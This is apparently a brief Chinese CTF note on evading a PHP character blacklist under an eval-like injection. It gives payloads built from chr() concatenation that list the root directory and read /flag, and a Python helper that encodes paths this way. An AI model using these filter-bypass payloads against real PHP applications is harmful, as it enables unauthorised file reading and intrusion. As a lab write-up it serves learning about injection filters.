# PHP 字符过滤 在函数伪eval条件下
```php
// 过滤范围
$blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
// 文件查找读取
// payload
// ls /
var_dump(scandir(chr(47)));
// cat /flag
var_dump(file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103)))
```
####  附：字符转换代码
```python
cmd = "/f1agg"
out = ""
for i in cmd:
    out+=f".chr({ord(i)})"
print(out[1:])
```
